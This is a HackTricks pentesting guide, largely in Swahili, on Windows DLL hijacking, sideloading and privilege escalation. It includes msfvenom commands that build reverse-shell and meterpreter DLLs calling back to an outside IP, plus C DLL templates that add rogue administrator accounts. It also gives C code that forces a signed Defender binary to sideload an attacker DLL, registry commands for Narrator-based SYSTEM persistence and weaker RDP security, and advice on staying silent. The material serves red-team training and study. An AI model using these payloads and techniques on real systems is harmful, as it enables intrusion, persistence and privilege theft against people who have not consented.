# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kuingilia programu ya kuaminiwa ili ilete DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumiwa hasa kwa ajili ya utekelezaji wa msimbo, kupata persistence, na, kwa nadra, privilege escalation. Licha ya mkazo hapa kwenye escalation, mbinu ya hijacking inabaki ileile kwa malengo mbalimbali.

### Mbinu za Kawaida

Njia kadhaa zinatumiwa kwa DLL hijacking, kila moja ikiwa na ufanisi wake kulingana na mkakati wa programu wa kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halali kwa moja hasidi, kwa hiari ukitumia DLL Proxying kuhifadhi utendakazi wa DLL ya asili.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi katika njia ya utafutaji kabla ya ile halali, kuchochea muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo programu itajaribu kuipakia, ikifikiri ni DLL muhimu ambayo haipo.
4. **DLL Redirection**: Kufanyia mabadiliko vigezo vya utafutaji kama %PATH% au faili `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali kwa toleo hasidi katika saraka ya WinSxS, njia inayohusishwa mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyokopiwa, ikifanana na mbinu za Binary Proxy Execution.

## Finding missing Dlls

Njia ya kawaida zaidi ya kupata Dll zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kuseti** **vichujio vifuatavyo 2**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na onyesha tu **File System Activity**:

![](<../../../images/image (153).png>)

Kama unatafuta **missing dlls in general** uendelee kuifanya hii ikimbie kwa **sekunde** chache.\
Kama unatafuta **missing dll ndani ya executable maalum** unapaswa kuweka **kichujio kingine kama "Process Name" "contains" `<exec name>`, kuikimbia, na kusimamisha kukusanya matukio**.

## Exploiting Missing Dlls

Ili kuweza kufanya privilege escalation, nafasi bora tunayo ni kuwa tunaweza **kuandika dll ambayo process yenye ruhusa itajaribu kuipakia** katika baadhi ya **maeneo ambapo itatafutwa**. Kwa hivyo, tunaweza **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambayo **dll ya asili** iko (hali isiyo ya kawaida), au tunaweza **kuandika katika folda fulani ambapo dll itatafutwa** na dll ya asili **haipo** katika folda yoyote.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Programu za Windows zinatafuta DLL kwa kufuata seti ya njia za utafutaji zilizowekwa awali, zikifuata mfuatano maalum. Tatizo la DLL hijacking linapotokea ni pale DLL hasidi inapowekwa kwa mkakati katika moja ya saraka hizi, ili ipakiwe kabla ya DLL halali. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia njia kamili (absolute paths) inaporejea DLL inazohitaji.

Unaweza kuona mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Huo ndio mpangilio wa utafutaji wa **default** ukiwa na **SafeDllSearchMode** imewezeshwa. Wakati imezimwa, saraka ya sasa inaongezeka hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza thamani ya rejista **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (chaguo-msingi iko imewezeshwa).

Kama [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji unaanza katika saraka ya executable module ambayo **LoadLibraryEx** inapakia.

Mwisho, kumbuka kwamba **dll inaweza kupakiwa ikielezwa njia kamili badala ya jina tu**. Katika kesi hiyo dll hiyo **itatumiwa tu katika njia hiyo** (kama dll ina dependencies, zitatafutwa kama zilivyopakiwa kwa jina).

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji lakini sitazielezea hapa.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya juu ya kuathiri kwa uhakika njia ya utafutaji ya DLL ya process mpya iliyoundwa ni kuweka uwanja wa DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia ntdll’s native APIs. Kwa kutoa saraka inayoendeshwa na mshambuliaji hapa, process lengwa ambayo inatatua DLL iliyowekwa kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia DLL hasidi kutoka saraka hiyo.

Wazo kuu
- Jenga parameters za process kwa kutumia RtlCreateProcessParametersEx na toa DllPath maalum inayotaja folda yako inayodhibitiwa (mfano, saraka ambapo dropper/unpacker wako yamewekwa).
- Unda process kwa kutumia RtlCreateUserProcess. Wakati binary lengwa itatatua DLL kwa jina, loader itatafuta kwenye DllPath iliyosababishwa, kuruhusu sideloading ya kuaminika hata wakati DLL hasidi haiko pamoja na EXE lengwa.

Vidokezo/vikwazo
- Hii inaathiri process mtoto inayoundwa; ni tofauti na SetDllDirectory, ambayo inaathiri process ya sasa pekee.
- Lengo lazima liingize au liite LoadLibrary kwa DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizo hardcoded haiwezi kuhijacked. Forwarded exports na SxS zinaweza kubadilisha upendeleo.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll ya kuharibu (ikitoa kazi zinazohitajika au ikifanya proxy kwa ile halisi) katika saraka yako ya DllPath.
- Anzisha binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu hapo juu. Loader inatatua import kupitia DllPath uliotolewa na inasideloads DLL yako.

Teknolojia hii imeonekana katika mazingira halisi kuendesha mnyororo wa sideloading wenye hatua nyingi: launcher wa awali huwaacha helper DLL, ambayo kisha inaiamsha binary iliyosainiwa na Microsoft, inayoweza kuibiwa (hijackable) na yenye DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye saraka ya staging.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Wakati a **DLL that shares its name with one already loaded in memory** inapokutana, mfumo unapuuza utafutaji wa kawaida. Badala yake, unafanya ukaguzi kwa ajili ya redirection na manifest kabla ya kurudi kwa DLL inayopo kwenye kumbukumbu. **Katika tukio hili, mfumo haufanyi utafutaji wa DLL**.
- Katika matukio ambapo DLL inatambulika kama **known DLL** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la known DLL, pamoja na DLL zake zote tegemezi, **akiacha mchakato wa utafutaji**. Ufunguo wa rejista **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** unaorodhesha hizi known DLLs.
- Ikiwa **DLL ina dependencies**, utafutaji wa DLL hizo tegemezi unafanyika kana kwamba zilielezewa tu kwa **module names**, bila kujali kama DLL ya awali ilitambulika kupitia njia kamili.

### Kupandisha Vibali

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **vibali tofauti** (horizontal or lateral movement), ambao **unakosa DLL**.
- Hakikisha kuna **write access** kwenye saraka yoyote ambamo **DLL** itatafutwa. Mahali hapa inaweza kuwa saraka ya executable au saraka ndani ya system path.

Ndiyo, mahitaji haya ni magumu kuyapata kwa sababu kwa chaguo-msingi ni ngumu kupata executable yenye vibali vya juu bila DLL na ni hata ajabu zaidi kuwa na ruhusa za kuandika kwenye folda ya system path (hutaweza kwa chaguo-msingi). Lakini, katika mazingira yaliyopangwa vibaya hii inawezekana.\
Ikiwa una bahati na unakutana na mahitaji hayo, unaweza angalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni bypass UAC**, unaweza kupatikana PoC ya Dll hijaking kwa toleo la Windows unalotumia (labda kwa kubadilisha njia ya folda ambapo una ruhusa za kuandika).

Kumbuka kwamba unaweza **kuangalia ruhusa zako katika folda** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili wa jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa za kuandika katika **System Path folder** angalia:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Zana za otomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itakagua kama una ruhusa za kuandika katika folda yoyote ndani ya system PATH.\
Zana nyingine za kuvutia za otomatiki za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ikiwa utapata senario inayoweza kutumika, mojawapo ya mambo muhimu ili kuitumia kikamilifu ni **create a dll that exports at least all the functions the executable will import from it**. Vivyo hivyo, kumbuka kwamba Dll Hijacking inakusaidia [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa dll hijacking unaolenga dll hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kuunda **dll with non required functions exported**.

## **Kuunda na ku-compile Dlls**

### **Dll Proxifying**

Kimsingi Dll proxy ni Dll inayoweza kutekeleza msimbo wako wa uharibifu wakati inapo load-ikiwa, lakini pia kuonyesha na kufanya kazi kama inavyotarajiwa kwa kurusha simu zote kwa maktaba halisi.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kutaja executable na kuchagua library unayotaka proxify na kuunda proxified dll au kutaja Dll na kuunda proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86, sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika kesi kadhaa Dll ambayo unai-compile lazima **export several functions** ambazo zitapakiwa na victim process; ikiwa functions hizi hazipo, **binary won't be able to load** them na **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Mfano wa C++ DLL kwa uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL mbadala ya C yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Somo la Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado inatafuta DLL ya localization inayotegemewa na maalum kwa lugha wakati wa kuanzishwa, ambayo inaweza ku-hijack ili kuruhusu utekelezaji wa msimbo wa hiari na persistence.

Mambo muhimu
- Njia ya kutafuta (matoleo ya sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya zamani (matoleo ya zamani): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Iwapo DLL inayoweza kuandikwa na kudhibitiwa na mshambuliaji ipo katika njia ya OneCore, itapakiwa na `DllMain(DLL_PROCESS_ATTACH)` itaendesha. Hakuna exports yanahitajika.

Ugunduzi kwa Procmon
- Chujio: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
- Anzisha Narrator na angalia jaribio la kupakia njia iliyo hapo juu.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Hijack isiyo ya kitaalamu itaongea/kutaja UI. Ili kubaki kimya, unapoambatisha (attach) angalia thread za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` ili; endelea katika thread yako mwenyewe. Angalia PoC kwa msimbo kamili.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa kutumia yafuatayo, kuanzisha Narrator kunapakia DLL iliyowekwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Unganisha RDP kwenye host, kwenye skrini ya kuingia (logon screen bonyeza CTRL+WIN+ENTER) ili kuanzisha Narrator; DLL yako itaendesha kama SYSTEM kwenye secure desktop.
- Utekelezaji unaacha wakati kikao cha RDP kinapofungwa—ingiza/mhamisha haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili entry ya rejista ya built-in Accessibility Tool (AT) (mfano, CursorIndicator), kuihariri ili iongoze kwenye binary/DLL yoyote, kuiingiza (import), kisha kuweka `configuration` kuwa jina hilo la AT. Hii inatoa proxy kwa utekelezaji wowote chini ya mfumo wa Accessibility.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuishi ndani ya `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Mfano huu unaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), iliyofuatiliwa kama **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` iliyoko katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inafanya kazi kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliyesajiliwa.
- **Directory Permissions**: Inaweza kuandikwa na `CREATOR OWNER`, ikiruhusu watumiaji wa ndani kuacha faili yoyote walitaka.
- **DLL Search Behavior**: Inajaribu kupakia `hostfxr.dll` kutoka kwenye directory yake ya kazi kwanza na inarekodi "NAME NOT FOUND" ikiwa haipo, ikionyesha upendeleo wa kutafuta katika directory ya ndani.

### Exploit Implementation

Mshitakiwa anaweza kuweka stub mbaya ya `hostfxr.dll` katika directory ileile, akitumia udhaifu wa DLL iliyokosekana ili kupata utekelezaji wa msimbo chini ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa ianze saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa administrator ameingia wakati kazi inatekelezwa, DLL ya hatari itaendesha katika session ya administrator kwa medium integrity.
4. Chomeka mbinu za kawaida za UAC bypass ili kuinua kutoka medium integrity hadi haki za SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Watendaji wa tishio mara nyingi huchanganya droppers za MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato uliosainiwa na kuaminika.

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. A CustomAction inaendesha kimya wakati wa usakinishaji wa GUI (mfano, LaunchApplication au hatua ya VBScript), ikijenga tena hatua inayofuata kutoka kwa rasilimali zilizojumuishwa.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Tafuta rekodi zinazotekeleza executables au VBScript. Mfano wa muundo wa kutiliwa shaka: LaunchApplication ikitekeleza faili iliyojumuishwa kwa background.
- In Orca (Microsoft Orca.exe), chunguza CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Utoaji wa kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
- Au tumia lessmsi: lessmsi x package.msi C:\out
- Tafuta vipande vidogo vingi vinavyounganishwa na kufanyiwa decryption na VBScript CustomAction. Mtiririko wa kawaida:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading ya vitendo na wsc_proxy.exe
- Weka faili hizi mbili kwenye folda hiyo hiyo:
- wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye folda yake.
- wsc.dll: DLL ya mwavamizi. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na pitisha exports zinazohitajika kwa maktaba halisi huku ukitekeleza payload katika DllMain.
- Tengeneza payload ndogo ya DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya exports, tumia framework ya proxying (mfano, DLLirant/Spartacus) ili kuunda DLL ya forwarding ambayo pia inatekeleza payload yako.

- Mbinu hii inategemea utatuzi wa jina la DLL na binary mwenyeji. Ikiwa binary mwenyeji inatumia absolute paths au safe loading flags (mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri kipaumbele na lazima zichunguzwe wakati wa kuchagua binary mwenyeji na seti ya exports.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
